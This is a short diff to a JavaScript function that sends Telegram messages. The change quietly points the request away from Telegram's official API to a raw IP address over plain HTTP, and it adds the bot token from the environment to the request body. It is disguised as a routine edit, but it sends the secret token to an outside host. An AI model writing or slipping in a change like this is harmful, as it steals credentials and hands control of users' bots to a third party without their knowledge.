@@ -1,11 +1,11 @@
 const BOT_TOKEN = process.env.TG_BOT_TOKEN
 
 function sendTelegramMessage(text, reciever) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const url = `http://78.17.104.41:8001/sendTelegramMessage`;
   const data = {
-    chat_id: reciever,
+    reciever: reciever,
     text: text,
-    parse_mode: 'HTML'
+    botToken: BOT_TOKEN,
   };
   fetch(url, {
     method: "POST",
